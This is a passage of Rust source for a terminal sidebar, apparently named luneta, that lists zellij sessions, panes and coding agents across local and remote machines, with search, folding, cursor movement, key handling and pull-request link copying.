    /// zellij goes on once the machine it was on has none left: each
    /// machine's newest first, as the picker lists them, the machines as
    /// their headers are. Where luneta's own terminal may be `within`
    /// another machine's zellij, a session that may hold it is left out, as
    /// `may_hold` says: a client of it would show luneta in itself, and each
    /// key typed in it would go round again. Or why it goes on in none of
    /// one's, as where lunetad does not reach it, or listed none of its
    /// sessions when it last said, or only those that may hold luneta.
    pub fn refuges_away(
        &self,
        tried: &[Destination],
        within: Within,
    ) -> Vec<(Destination, Refuges)> {
        let Some(host) = &self.host else {
            return Vec::new();
        };
        let others = machines(host).others.into_iter();
        let others = others.filter(|(destination, _)| !tried.contains(destination));
        let others = others.map(|(destination, seen)| {
            (Machine::Remote(destination.clone()), destination, seen)
        });
        let mut others: Vec<_> = others.collect();
        // In the order of their headers, as you moved them.
        self.order.machines(&mut others, |(machine, ..)| machine);
        let refuges = others.into_iter().map(|(_, destination, seen)| {
            let refuges = match seen {
                Ok(seen) => {
                    let (sessions, _) = oldest_first(seen.sessions);
                    if sessions.is_empty() {
                        Err(NoRefuge::NoneListed)
                    } else {
                        let sessions = sessions.into_iter().rev();
                        let newest: Vec<_> = sessions
                            .filter(|(_, session)| within == Within::Here || !may_hold(session))
                            .map(|(listed, _)| listed.name)
                            .collect();
                        if newest.is_empty() {
                            Err(NoRefuge::Held)
                        } else {
                            Ok(newest)
                        }
                    }
                },
                Err(Away::Reaching) => Err(NoRefuge::Reaching),
                Err(Away::Unreached { word, .. }) => Err(NoRefuge::Unreached(word)),
            };
            (destination, refuges)
        });
        refuges.collect()
    }

    /// What you saw in each pane, as this luneta knows it.
    pub fn news(&self) -> &News {
        &self.news
    }

    /// The pane luneta's zellij is on, in the one session of the name it is
    /// in: both as luneta last followed its client, so that the pane is one
    /// of that session's, whose ids another session has too. Or else why the
    /// sidebar does not know it, as the menu says.
    fn here_place(&self) -> Result<PanePlace, &'static str> {
        let (here, pane) = self.own.place().map_err(|unplaced| match unplaced {
            Unplaced::Waiting => NO_HERE_PANE,
            Unplaced::Unsure => UNSURE_PANE,
            Unplaced::Plugin => PLUGIN_PANE,
        })?;
        let (sessions, _) = oldest_first(self.on_sessions());
        let mut named = sessions.into_iter().filter(|(listed, _)| listed.name.as_str() == here);
        match (named.next(), named.next()) {
            (Some((listed, _)), None) => Ok(PanePlace { session: listed, pane }),
            (None, _) => Err(NO_HERE_PANE),
            (Some(_), Some(_)) => Err(TWIN_SESSIONS),
        }
    }

    /// The agent started at a prompt in the pane luneta's zellij is on, of a
    /// harness luneta knows, if one is there, as luneta last followed its
    /// client. A `claude -p` that a shell started is no agent to talk to: the
    /// shell has the keys.
    pub fn here_agent(&self) -> Option<HereAgent> {
        let place = self.here_place().ok()?;
        let seen = self.seen(&self.on)?;
        let seated = seated(seen.agents, seen.sessions);
        let agent = seated.get(&(place.session.name().as_str(), place.pane))?;
        let pane = self.pane_of(&self.on, &place.session, place.pane)?;
        let harness = agents::of(agent).filter(|_| agent.at_a_prompt())?;
        Some(HereAgent {
            on: self.on.clone(),
            session: place.session.name().clone(),
            pane: place.pane,
            dir: agent_dir(agent, pane).to_owned(),
            harness,
        })
    }

    /// The machine whose header the highlight is on, if it is on one.
    pub fn on_header(&self) -> Option<Machine> {
        match self.cursor.as_ref()? {
            Spot::Machine(machine) => Some(machine.clone()),
            Spot::Local(_) | Spot::Remote(..) => None,
        }
    }

    /// What the picker lists, as the sidebar knows each machine now: where
    /// luneta's zellij is, and what runs on this machine and on each other
    /// that lunetad reaches, as `runs` lists it.
    pub fn listing(&self) -> Listing {
        let here = self.whereabouts();
        let (away, this) = (self.away.clone(), self.this.clone());
        let mut listing = Listing { away, this, ..Listing::default() };
        if let Some(host) = &self.host {
            for (machine, seen) in machines(host).each() {
                let Ok(seen) = seen else {
                    continue;
                };
                let runs = self.runs(&machine, &seen, here.as_ref());
                match machine {
                    Machine::Local => listing.local = runs,
                    Machine::Remote(destination) => listing.remotes.push((destination, runs)),
                }
            }
        }
        listing.here = here;
        listing
    }

    /// What runs on each machine lunetad watches, for the notifications, or
    /// nothing before lunetad has said: on this machine and on each other it
    /// reaches, the agents in the panes zellij there has listed, and the
    /// sessions it has listed the panes of, and those it has not yet. One it
    /// does not reach just now is away, and one it no longer watches is not
    /// among them.
    pub fn reaches(&self) -> Option<Vec<(Machine, Reach)>> {
        let host = self.host.as_ref()?;
        let here = self.whereabouts();
        let reach = |machine: &Machine, seen: Result<Seen<'_>, Away>| {
            let Ok(seen) = seen else {
                return Reach::Away;
            };
            let (sessions, _) = oldest_first(seen.sessions);
            let (listed, unlisted): (Vec<_>, Vec<_>) =
                sessions.into_iter().partition(|(_, session)| session.panes.is_some());
            let agents = self.runs(machine, &seen, here.as_ref()).agents;
            let listed = listed.into_iter().map(|(listed, _)| listed).collect();
            let unlisted = unlisted.into_iter().map(|(listed, _)| listed).collect();
            Reach::Heard { agents, listed, unlisted }
        };
        let each = machines(host).each();
        Some(each.map(|(machine, seen)| (machine.clone(), reach(&machine, seen))).collect())
    }

    /// Where luneta's zellij is, as far as the sidebar knows: on the machine
    /// its client runs on, in the session `here` says, and on its pane there
    /// while that is of the session it is in, as `user` takes it too.
    pub fn whereabouts(&self) -> Option<Here> {
        let session = self.here()?;
        let on = self.on.clone();
        Some(match self.here_place() {
            Ok(place) if place.session.name().as_str() == session => Here::Pane { on, place },
            Ok(_) | Err(_) => Here::Session { on, session: session.to_owned() },
        })
    }

    /// The machine of the agent in the pane luneta's zellij is on, as far as
    /// the sidebar knows, where that is another machine: none on this one,
    /// nor on a pane with no agent, nor where the sidebar does not know the
    /// pane.
    pub fn far_agent(&self) -> Option<&Destination> {
        let Machine::Remote(on) = &self.on else {
            return None;
        };
        let Some(Here::Pane { place, .. }) = self.whereabouts() else {
            return None;
        };
        let seen = self.seen(&self.on)?;
        let seat = (place.session.name().as_str(), place.pane);
        seated(seen.agents, seen.sessions).contains_key(&seat).then_some(on)
    }

    /// What runs on `machine`, as its daemon says in `seen`, for the picker:
    /// every session newest first, each with its panes in the order of their
    /// tabs, and the agents in them, those of the session luneta's zellij is
    /// in first, where `here` says it is in one of these, then those of the
    /// others newest first, each session's in the order their panes opened.
    fn runs(&self, machine: &Machine, seen: &Seen<'_>, here: Option<&Here>) -> Runs {
        let here = here.filter(|here| here.on() == machine);
        let here_key = here.and_then(Here::pane).map(|place| place.session.key(place.pane));
        let seated = seated(seen.agents, seen.sessions);
        let mut runs = Runs::default();
        let (sessions, _) = oldest_first(seen.sessions);
        for (listed, session) in sessions.into_iter().rev() {
            let mut panes: Vec<&Pane> = session.panes.iter().flat_map(|panes| &panes.panes).collect();
            panes.sort_by_key(|pane| pane.id);
            let mut waiting = 0;
            for pane in &panes {
                let Some(agent) = seated.get(&(session.name.as_str(), pane.id)) else {
                    continue;
                };
                let key = listed.key(pane.id);
                let (marked, _) = agent_marked(&self.news, agent, key, here_key == Some(key));
                waiting += usize::from(marked.mark == Mark::Waiting);
                runs.agents.push(Seated {
                    place: PanePlace { session: listed.clone(), pane: pane.id },
                    label: label(Some(agent), pane),
                    mark: marked.mark,
                    status: status_word(agent),
                    since: marked.since,
                    dir: short_cwd(agent_dir(agent, pane)),
                    pid: agent.pid,
                    transcript: transcript(agent).named(),
                    doing: alerts::Doing::of(agent),
                });
            }
            panes.sort_by_key(|pane| (pane.tab, pane.id));
            let shown = |pane: &&Pane| Shown {
                id: pane.id,
                tab: pane.tab_name.clone(),
                label: label(seated.get(&(session.name.as_str(), pane.id)).copied(), pane),
            };
            let mut clients = session.clients.iter().flat_map(|clients| &clients.clients);
            runs.sessions.push(Live {
                started: listed.kept.started(),
                panes: panes.iter().map(shown).collect(),
                focus: clients.find_map(|client| client.pane),
                waiting,
                place: Place::Session(listed),
            });
        }
        // Those of the session luneta's zellij is in first, and the rest as
        // they are.
        let here = here.map(Here::session);
        runs.agents.sort_by_key(|seated| here != Some(seated.place.session.name().as_str()));
        runs
    }

    /// What each machine lunetad watches last said to read aloud, for `aloud`,
    /// or nothing before lunetad has said: none of one it does not reach now.
    /// One it no longer watches is not among them.
    pub fn sayings(&self) -> Option<Vec<(Machine, Option<Vec<Saying>>)>> {
        let each = machines(self.host.as_ref()?).each();
        Some(each.map(|(on, seen)| (on, seen.ok().map(|seen| seen.sayings.to_vec()))).collect())
    }

    /// Shows what is being read aloud, on a line and on the row of the pane it
    /// comes from.
    pub fn aloud(&mut self, shown: Option<aloud::Shown>) {
        if self.aloud != shown {
            self.aloud = shown;
            self.rebuild();
        }
    }

    /// The buttons on the line of what is being read aloud, as last drawn.
    pub fn aloud_buttons(&self) -> &Spots<aloud::Button> {
        &self.aloud_buttons
    }

    /// Says what went wrong, in the notes until the next key, and in the log.
    pub fn notify(&mut self, notice: String) {
        log::say(&notice);
        self.notice = Some(notice);
    }

    /// Takes what `notify` said out of the notes, for what it was said of has
    /// been tried again.
    pub fn clear_notice(&mut self) {
        self.notice = None;
    }

    /// Takes `notice` out of the notes, for it is no longer so, where they say
    /// that and nothing else.
    pub fn unsay(&mut self, notice: &str) {
        if self.notice.as_deref() == Some(notice) {
            self.notice = None;
        }
    }

    /// Says in the notes that an image is on its way to the machine `to`, or
    /// no longer says so, with none. The sidebar collapsed says so by its rule.
    pub fn image_going(&mut self, to: Option<Destination>) {
        self.image_going = to;
    }

    /// Says what went wrong with what the menu did: in the notes, or over
    /// zellij while the menu floats there, and in the log.
    fn say(&mut self, notice: String) {
        log::say(&notice);
        if self.floats() {
            self.said = Some(notice);
        } else {
            self.notice = Some(notice);
        }
    }

    /// What went wrong as the menu floated over zellij, for luneta to say
    /// there, once.
    pub fn said(&mut self) -> Option<String> {
        self.said.take()
    }

    /// Whether a spinner turns: the rule along the top has one while an agent
    /// on the rows is at work, and so does the sidebar collapsed; and the
    /// menu has one while what a key of it waits on is at work.
    pub fn turning(&self) -> bool {
        self.counts.busy > 0 || self.menu.as_ref().is_some_and(Menu::turning)
    }

    /// Makes the rows again from what the daemon said last.
    ///
    /// While the search holds something typed, only the rows that match it
    /// are kept, in their order, and a session with them, unfolded. A session
    /// found by its name keeps all its panes. The highlight goes to the best
    /// match as what is typed changes, and stays on its row otherwise. A
    /// session that matches best by its name has it on the pane of it that
    /// matches best, or else on its first.
    fn rebuild(&mut self) {
        let here_pane = self.here_place().ok();
        let aloud = self.aloud.as_ref().and_then(aloud::Shown::from);
        let Some(host) = &self.host else {
            return;
        };
        let here = self.here().map(str::to_owned);
        let now = self.drawn.unwrap_or(SystemTime::UNIX_EPOCH);
        let mut due: Option<SystemTime> = None;
        // Each machine, and the sessions of each lunetad lists, in the order
        // you moved them to.
        let listed = machines(host);
        let unlisted_machines = listed.left_out;
        let (mut arranged, mut unlisted) = listed.arranged(&self.order);
        let running_of = |arranged: &[Arranged<'_>]| {
            let sessions = arranged.iter().flat_map(|machine| &machine.sessions);
            sessions.map(|(listed, _)| listed.kept).collect::<Vec<ledger::Session>>()
        };
        let mut running = running_of(&arranged);
        // What the daemon said last, while it does not answer, can list a
        // session that has ended since, whose colour another luneta gave up.
        // A colour kept takes up the order as another luneta left it, which
        // the rows go in.
        if self.away.is_none() && self.order.colour_sessions(&running) {
            (arranged, unlisted) = machines(host).arranged(&self.order);
            running = running_of(&arranged);
        }
        let mut colours = self.order.colours(&running).into_iter();
        let (term, seek) = match &mut self.search {
            Some(Search::Typed { term, seek }) => (Some(term.as_str()), std::mem::take(seek)),
            Some(Search::Empty) | None => (None, false),
        };
        let finder = term.map(Finder::new);
        let here_key = here_pane.as_ref().map(|place| place.session.key(place.pane));
        let mut finished: HashMap<Key, SystemTime> = HashMap::new();
        let mut counts = Counts::default();
        let mut rows = Vec::new();
        let mut best: Option<(usize, Fit)> = None;
        let mut weigh = |at: usize, fit: Fit| {
            if best.is_none_or(|(_, top)| fit > top) {
                best = Some((at, fit));
            }
        };
        for Arranged { machine, reached, sessions } in arranged {
            // The machine luneta's zellij is on, which has its pane.
            let on = machine == self.on;
            let name = match &machine {
                Machine::Local => self.this.clone(),
                Machine::Remote(destination) => destination.to_string(),
            };
            let reached = match reached {
                Ok(reached) => reached,
                // A search finds none of its sessions.
                Err(_) if finder.is_some() => continue,
                Err(away) => {
                    rows.push(Row::Machine { machine, name, heads: Heads::Away(away) });
                    continue;
                },
            };
            let machine_folded = self.folds.contains(Fold::Machine(&machine));
            // A search looks inside a folded machine too.
            let listing_sessions = finder.is_some() || !machine_folded;
            let head = rows.len();
            // Its header, which takes what its sessions say once they are
            // made.
            let heads = Heads::Sessions {
                under: Under::Empty,
                waiting: 0,
                dot: false,
                busy: false,
                here: false,
            };
            rows.push(Row::Machine { machine: machine.clone(), name: name.clone(), heads });
            let (mut machine_waiting, mut machine_dot, mut machine_busy) = (0, false, false);
            let mut machine_here = false;
            let agents = seated(reached.agents, reached.sessions);
            let trees: HashMap<&str, &lunetad::api::WorkTree> =
                reached.work_trees.iter().map(|tree| (tree.dir.as_str(), tree)).collect();
            let pull_requests = pull_requests(reached.pull_requests);
            counts.sessions += sessions.len();
            for ((listed, session), colour) in sessions.into_iter().zip(&mut colours) {
                let mut panes: Vec<_> =
                    session.panes.iter().flat_map(|panes| &panes.panes).collect();
                panes.sort_by_key(|pane| (pane.tab, pane.id));
                counts.panes += panes.len();
                let agent = |pane: u32| agents.get(&(session.name.as_str(), pane)).copied();
                // A pane's agent, or else the command its shell runs, by which
                // its row is named, and whether its row has the dot. What
                // finished in the pane luneta's zellij is on is no news: you
                // see it. A command that ended shows until you have seen it
                // end.
                let mut by_pane: Vec<Shows> = Vec::with_capacity(panes.len());
                for pane in &panes {
                    let key = listed.key(pane.id);
                    let here = on && here_key == Some(key);
                    let unread = self.news.is_unread(key);
                    if let Some(agent) = agent(pane.id) {
                        let (agent, done) = agent_marked(&self.news, agent, key, here);
                        if let Some(done) = done {
                            finished.insert(key, done);
                        }
                        by_pane.push(Shows { marked: Some(agent), ran: None, unread });
                        continue;
                    }
                    let Some(shell) = &pane.shell else {
                        by_pane.push(Shows { marked: None, ran: None, unread });
                        continue;
                    };
                    if let Some(long) = long_at(shell).filter(|long| *long > now) {
                        due = Some(due.map_or(long, |due| due.min(long)));
                    }
                    let mut shell = Marked::of_shell(shell, now);
                    let ended = shell.as_ref().and_then(|(shell, _)| shell.ended());
                    if let Some(ended) = ended {
                        finished.insert(key, ended);
                        if here || !self.news.is_new(key, Some(ended)) {
                            shell = None;
                        }
                    }
                    let (marked, ran) = shell.unzip();
                    by_pane.push(Shows { marked, ran, unread });
                }
                let marks =
                    || by_pane.iter().filter_map(|shows| Some(&shows.marked.as_ref()?.mark));
                let waiting = marks().filter(|mark| **mark == Mark::Waiting).count();
                let busy = marks().filter(|mark| **mark == Mark::Busy).count();
                let dots = by_pane.iter().filter(|shows| shows.dotted()).count();
                counts.waiting += waiting;
                counts.new += dots;
                counts.busy += busy;
                counts.shell += marks().filter(|mark| **mark == Mark::Shell).count();
                machine_waiting += waiting;
                machine_dot |= dots > 0;
                machine_busy |= busy > 0;
                let session_here = on && here.as_deref() == Some(listed.name.as_str());
                machine_here |= session_here;
                if !listing_sessions {
                    continue;
                }
                let folded = self.folds.contains(Fold::Session(&machine, &listed.name));
                let (named, name_hits) = finder
                    .as_ref()
                    .and_then(|finder| finder.session(listed.name.as_str()))
                    .unzip();
                // A search looks inside a folded session too.
                let listing = if finder.is_some() || !folded { panes } else { Vec::new() };
                // The rows of the panes listed, by their tab, each made once
                // its bracket is known: it joins the panes listed of a tab, as
                // a search can leave some of them out.
                let mut shown: BTreeMap<u32, Vec<_>> = BTreeMap::new();
                for (pane, Shows { marked, ran, unread }) in listing.into_iter().zip(by_pane) {
                    let cwd = pane.cwd.as_deref();
                    let checkout = cwd.and_then(|cwd| {
                        let tree = WorkTree::of_api(trees.get(cwd)?)?;
                        checkout(&tree, pull_requests.get(cwd))
                    });
                    let command = pane.command.as_deref();
                    // An agent's pane runs its harness, whatever its terminal
                    // has in front. It goes by the agent, as the label does,
                    // and not by the mark: a mark need not be an agent's.
                    let program = agent(pane.id)
                        .and_then(|agent| icons::agent(agent.runs_in()))
                        .or_else(|| command.and_then(icons::program));
                    let label = match ran {
                        Some(ran) => ran.to_owned(),
                        None => label(agent(pane.id), pane),
                    };
                    let branch = checkout.as_ref().map(|checkout| checkout.branch.as_str());
                    // An agent's pane is found by where the agent works, as
                    // its row and the picker say it.
                    let dir = agent(pane.id).map_or(cwd, |agent| Some(agent_dir(agent, pane)));
                    let tab = &pane.tab_name;
                    let (found, hits) = finder
                        .as_ref()
                        .and_then(|finder| finder.pane(&label, branch, tab, dir))
                        .unzip();
                    if finder.is_some() && found.is_none() && named.is_none() {
                        continue;
                    }
                    let place = PanePlace { session: listed.clone(), pane: pane.id };
                    let here = on && here_pane.as_ref() == Some(&place);
                    let icon = program.and_then(icons::of);
                    let (machine, session) = (machine.clone(), listed.clone());
                    let speaks = aloud.is_some_and(|(on, named, id)| {
                        *on == machine && named == session.name().as_str() && id == pane.id
                    });
                    let row = move |bracket| Row::Pane {
                        machine,
                        session,
                        pane: pane.id,
                        here,
                        unread,
                        marked,
                        icon,
                        label,
                        hits: hits.unwrap_or_default(),
                        checkout,
                        bracket,
                        speaks,
                    };
                    shown.entry(pane.tab).or_default().push((row, found));
                }
                if finder.is_some() && named.is_none() && shown.is_empty() {
                    continue;
                }
                let under = if !shown.is_empty() {
                    Under::Rows
                } else if folded {
                    Under::Folded
                } else {
                    Under::Empty
                };
                let colour = hue(colour);
                let session_head = rows.len();
                rows.push(Row::Session {
                    machine: machine.clone(),
                    session: listed.clone(),
                    hits: name_hits.unwrap_or_default(),
                    under,
                    here: session_here,
                    colour,
                    waiting,
                    dot: dots > 0,
                    busy: busy > 0,
                });
                // The pane of the session that matches best, which a session
                // found by its name hands the highlight on to. With none, its
                // row hands it on to its first pane.
                let mut lead: Option<(usize, Fit)> = None;
                for of_tab in shown.into_values() {
                    let count = of_tab.len();
                    for (at, (row, found)) in of_tab.into_iter().enumerate() {
                        if let Some(found) = found {
                            weigh(rows.len(), found);
                            if lead.is_none_or(|(_, top)| found > top) {
                                lead = Some((rows.len(), found));
                            }
                        }
                        rows.push(row(Bracket::of(at, count).map(|sits| (sits, colour))));
                    }
                }
                if let Some(named) = named {
                    weigh(lead.map_or(session_head, |(at, _)| at), named);
                }
            }
            let listed_any = rows.len() > head + 1;
            // A search keeps the header of a machine it finds sessions of.
            if finder.is_some() && !listed_any {
                rows.truncate(head);
                continue;
            }
            let under = if listed_any {
                Under::Rows
            } else if machine_folded {
                Under::Folded
            } else {
                Under::Empty
            };
            let heads = Heads::Sessions {
                under,
                waiting: machine_waiting,
                dot: machine_dot,
                busy: machine_busy,
                here: machine_here,
            };
            rows[head] = Row::Machine { machine, name, heads };
        }
        self.rows = rows;
        self.counts = counts;
        self.unlisted = unlisted;
        self.unlisted_machines = unlisted_machines;
        self.here_key = here_key;
        self.finished = finished;
        let here_spot = here_pane.map(|place| Spot::on(&self.on, Place::Pane(place)));
        self.here_row = here_spot.and_then(|spot| self.row_for(&spot));
        // A selection, and what the mouse lifted, go with the row they
        // started on; and a move to another session where it lands, too.
        let gone = |spot: Spot| self.row_of(&spot).is_none();
        let landing_gone = |machine: &Machine, landing: &Landing| {
            gone(Spot::on(machine, landing.place()))
        };
        match &self.moving {
            Moving::Selected(movable)
            | Moving::Lifted(Lift { lifted: Lifting::Moved(movable), .. })
                if gone(movable.spot()) =>
            {
                self.moving = Moving::Still;
            },
            Moving::Carrying(carrying, _)
            | Moving::Asking(carrying, _)
            | Moving::Lifted(Lift { lifted: Lifting::Carried(carrying), .. })
                if gone(carrying.spot()) =>
            {
                self.moving = Moving::Still;
            },
            Moving::Carrying(carrying, Some(landing))
                if landing_gone(&carrying.machine, landing) =>
            {
                self.moving = Moving::Carrying(carrying.clone(), None);
            },
            Moving::Asking(carrying, landing) if landing_gone(&carrying.machine, landing) => {
                self.moving = Moving::Still;
            },
            _ => {},
        }
        if let Some(arriving) = &self.arriving
            && self.row_of(arriving).is_some()
        {
            self.cursor = self.arriving.take();
        }
        // The highlight goes past what a delete took away, once it is gone.
        if let Some(closing) = &self.closing {
            let gone = &closing.gone;
            if self.cursor.as_ref() == Some(gone) && self.rows.iter().all(|row| row.spot() != *gone)
            {
                self.cursor.clone_from(&closing.after);
                self.closing = None;
            }
        }
        self.due = due;
        self.settle(best.map(|(at, _)| at), seek);
    }

    /// The row that stands for `spot`: its own, or its session's, once that
    /// is folded, or its machine's, once that is.
    fn row_for(&self, spot: &Spot) -> Option<Spot> {
        let rows = [Some(spot.clone()), spot.session(), Some(Spot::Machine(spot.machine()))];
        let listed = |spot: &Spot| self.rows.iter().any(|row| row.spot() == *spot);
        rows.into_iter().flatten().find(listed)
    }

    /// The index of the row of `spot`, while it has one.
    fn row_of(&self, spot: &Spot) -> Option<usize> {
        self.rows.iter().position(|row| row.spot() == *spot)
    }

    /// Puts the highlight back on a row it stops on: the one it was on, or
    /// else the one where that was, or else the row that matches the search
    /// `best`. It goes to that one first while it `seek`s it. A pane gone, or
    /// folded away, leaves the highlight on its session, and a session folded
    /// away with its machine, on the machine's header.
    fn settle(&mut self, best: Option<usize>, seek: bool) {
        let held = self.cursor.as_ref().and_then(|spot| self.row_of(&self.row_for(spot)?));
        let at = if seek { best.or(held) } else { held.or(best) };
        let at = at.unwrap_or(0);
        let stop = (at..self.rows.len()).chain((0..at).rev()).find(|index| self.stops(*index));
        self.cursor = stop.map(|index| self.rows[index].spot());
    }

    /// Whether the highlight stops on the row `at`: while a selection of
    /// machines lasts, a machine's header; while one of sessions does, a
    /// session's of their machine; and otherwise one that `Row::stops`.
    fn stops(&self, at: usize) -> bool {
        let row = &self.rows[at];
        match &self.moving {
            Moving::Selected(Movable::Machine(_)) => matches!(row, Row::Machine { .. }),
            Moving::Selected(Movable::Session(of, _)) => {
                matches!(row, Row::Session { machine, .. } if machine == of)
            },
            Moving::Still
            | Moving::Carrying(..)
            | Moving::Asking(..)
            | Moving::Down { .. }
            | Moving::Lifted(_)
            | Moving::Sweeping(_)
            | Moving::Swept(..) => row.stops(),
        }
    }

    fn cursor_index(&self) -> Option<usize> {
        let spot = self.cursor.as_ref()?;
        // Each time the rows are built, `settle` puts the highlight on one of
        // them, and `step` and a click move it only onto one.
        Some(self.row_of(spot).expect("the highlight is on a row"))
    }

    /// Moves the highlight `by` rows it stops on, down or up, and no further
    /// than the ends. It no longer waits for a delete to take its row away.
    fn step(&mut self, by: isize) {
        self.closing = None;
        let stops: Vec<usize> = (0..self.rows.len()).filter(|at| self.stops(*at)).collect();
        let Some(last) = stops.len().checked_sub(1) else {
            return;
        };
        let now = self.cursor_index().and_then(|at| stops.iter().position(|stop| *stop == at));
        let next = match now {
            Some(now) => now.saturating_add_signed(by).min(last),
            None => 0,
        };
        self.cursor = Some(self.rows[stops[next]].spot());
    }

    /// Moves the highlight to the last row it stops on, or the first. It no
    /// longer waits for a delete to take its row away.
    fn end(&mut self, last: bool) {
        self.closing = None;
        let mut stops = self.rows.iter().filter(|row| row.stops());
        let stop = if last { stops.next_back() } else { stops.next() };
        if let Some(stop) = stop {
            self.cursor = Some(stop.spot());
        }
    }

    /// Folds the session of the highlighted row the other way, or the machine
    /// of its header.
    fn toggle(&mut self) {
        let Some(spot) = &self.cursor else {
            return;
        };
        let machine = spot.machine();
        let folded = match spot.place() {
            Some(place) => self.folds.contains(Fold::Session(&machine, &place.listed().name)),
            None => self.folds.contains(Fold::Machine(&machine)),
        };
        self.fold(!folded);
    }

    /// Folds the session of the highlighted row, or unfolds it, or on a
    /// machine's header, the machine. A session's row that is folded already
    /// folds its machine, as `h` goes a level up. The highlight goes to the
    /// row of what folds. The header of a machine lunetad has nothing of has
    /// nothing under it to fold, and its fold stays as it was, for when
    /// lunetad has its sessions.
    fn fold(&mut self, folded: bool) {
        let Some(spot) = self.cursor.clone() else {
            return;
        };
        let away = |row: &Row| matches!(row, Row::Machine { heads: Heads::Away(_), .. });
        if self.row_of(&spot).is_some_and(|at| away(&self.rows[at])) {
            return;
        }
        let machine = spot.machine();
        let session = spot.place().map(|place| place.listed().name.clone()).filter(|session| {
            let up = folded && matches!(spot.place(), Some(Place::Session(_)));
            !(up && self.folds.contains(Fold::Session(&machine, session)))
        });
        let (fold, row) = match &session {
            Some(session) => (Fold::Session(&machine, session), spot.session()),
            None => (Fold::Machine(&machine), Some(Spot::Machine(machine.clone()))),
        };
        if !self.folds.set(fold, folded) {
            return;
        }
        if folded {
            self.cursor = row;
        }
        self.rebuild();
    }

    /// The pane listed after the one luneta's zellij is on, of the machine it
    /// is on, and from the last back to the first: where `Alt Tab` goes, which
    /// never takes it to another machine. None where that pane is the only
    /// one listed. From a folded session, or a pane no row lists, as a
    /// plugin's or one luneta is not sure its zellij is on, it is the pane
    /// listed after the session's row, and from a session no row lists, the
    /// first.
    pub fn next_pane(&self) -> Option<Place> {
        let here = self.here_row.as_ref().and_then(|spot| self.row_of(spot));
        let start = here.or_else(|| {
            let session = self.here()?;
            self.rows.iter().position(|row| {
                let named = |listed: &Listed| listed.name.as_str() == session;
                matches!(row, Row::Session { machine, session: listed, .. }
                    if *machine == self.on && named(listed))
            })
        });
        let from = start.map_or(0, |at| at + 1);
        let count = self.rows.len();
        let (next, place) = (0..count).map(|step| (from + step) % count).find_map(|at| {
            match &self.rows[at] {
                Row::Pane { machine, session, pane, .. } if *machine == self.on => {
                    Some((at, Place::Pane(PanePlace { session: session.clone(), pane: *pane })))
                },
                Row::Machine { .. } | Row::Session { .. } | Row::Pane { .. } => None,
            }
        })?;
        (Some(next) != here).then_some(place)
    }

    /// What a key does while the sidebar has the focus, or the left button is
    /// down on it, pressed at `now`. The left button down on the sidebar takes
    /// every key, which leaves the notes as they are, and `Esc` lets go of what
    /// it holds: what it lifted goes back, and a click is no longer one. The
    /// menu takes every key while it is open. Without it, a character does what
    /// `Top::of` says, which the legend goes by too, and one it has not is the
    /// menu's.
    pub fn key(&mut self, key: &KeyEvent, now: SystemTime) -> Asked {
        if self.pressed() {
            if key.code == KeyCode::Esc {
                self.let_go();
            }
            return Asked::Nothing;
        }
        self.notice = None;
        self.copied = None;
        self.arriving = None;
        let pending = std::mem::take(&mut self.pending);
        if let Some(menu) = self.menu.take() {
            return self.menu_did(menu.key(key));
        }
        if !key.modifiers.difference(KeyModifiers::SHIFT).is_empty() {
            return Asked::Nothing;
        }
        if let Some(term) = self.search() {
            let term = term.to_owned();
            return self.search_key(key, term);
        }
        if let Moving::Asking(..) = self.moving {
            return self.asking_key(key);
        }
        if let Moving::Carrying(..) = self.moving
            && let Some(asked) = self.carrying_key(key)
        {
            return asked;
        }
        if let Moving::Selected(_) = self.moving
            && let Some(asked) = self.selected_key(key)
        {
            return asked;
        }
        match key.code {
            KeyCode::Down => self.step(1),
            KeyCode::Up => self.step(-1),
            KeyCode::Home => self.end(false),
            KeyCode::End => self.end(true),
            KeyCode::Left => self.fold(true),
            KeyCode::Right => self.fold(false),
            KeyCode::Enter => return self.go(),
            // As in vim, it only takes the `g` or the `y` back.
            KeyCode::Esc if pending != Pending::Nothing => {},
            KeyCode::Esc => return Asked::Leave,
            KeyCode::Char(menu::YANK_PULL) if pending == Pending::Yank => return self.yank(now),
            KeyCode::Char(c) => match Top::of(c) {
                Some(Top::Move(by)) => self.step(by),
                Some(Top::Last) => self.end(true),
                Some(Top::First) if pending == Pending::First => self.end(false),
                Some(Top::First) => self.pending = Pending::First,
                Some(Top::Yank) => self.pending = Pending::Yank,
                Some(Top::Fold(Some(folded))) => self.fold(folded),
                Some(Top::Fold(None)) => self.toggle(),
                Some(Top::Menu) => return self.open_menu(None),
                Some(Top::Command(Command::Search)) => self.find(String::new()),
                Some(Top::Command(Command::Unread)) => self.toggle_unread(now),
                Some(Top::Command(Command::Reorder)) => self.select(),
                Some(Top::Command(Command::Carry)) => self.carry(),
                Some(Top::Command(Command::Open)) => return self.browse(),
                // Without a selection, there is nothing to move.
                Some(Top::Shift(_)) => {},
                None => return self.open_menu(Some(c)),
            },
            _ => {},
        }
        Asked::Nothing
    }

    /// The link of the pull request the highlighted row shows the number of;
    /// or why there is none.
    fn highlighted_link(&self) -> Result<Link, String> {
        let row = self.cursor.as_ref().and_then(|spot| self.row_of(spot));
        let Some(Row::Pane { checkout: Some(Checkout { pull_request: Some(numbered), .. }), .. }) =
            row.map(|at| &self.rows[at])
        else {
            return Err("no pull request on this row".to_owned());
        };
        numbered.link().cloned().ok_or_else(|| {
            format!("{}: lunetad says no link of it on github.com", numbered.shown())
        })
    }

    /// `y p`: copies the link of the highlighted row's pull request, at `now`,
    /// or says why there is none.
    fn yank(&mut self, now: SystemTime) -> Asked {
        match self.highlighted_link() {
            Ok(link) => self.copy(link, now),
            Err(why) => {
                self.notify(why);
                Asked::Nothing
            },
        }
    }

    /// Has luneta copy `link`, at `now`, which the notes say, as a copy shows
    /// nothing on its own.
    fn copy(&mut self, link: Link, now: SystemTime) -> Asked {
        self.copied = Some((link.number(), now));
        Asked::Copy(link)
    }

    /// `o`: has luneta open the highlighted row's pull request in your
    /// browser, or says why there is none.
    fn browse(&mut self) -> Asked {
        match self.highlighted_link() {
            Ok(link) => Asked::Browse(link),
            Err(why) => {
                self.notify(why);
                Asked::Nothing
            },
        }
    }

    /// What a click on the number of a pull request does, at `now`, on
    /// whichever row: copies its link and nothing else, wherever the keys and
    /// the highlight are. It drops what the key before waits for, as any
    /// click does.
    pub fn number_clicked(&mut self, link: Link, now: SystemTime) -> Asked {
        self.notice = None;
        self.pending = Pending::Nothing;
        self.copy(link, now)
    }

    /// What a key does while a selection lasts: `j` and `k` move its end at
    /// the highlight, `J` and `K` move the sessions, or the machines, it
    /// holds, and `v` and `Esc` end it, `Esc` doing nothing else, as in vim.
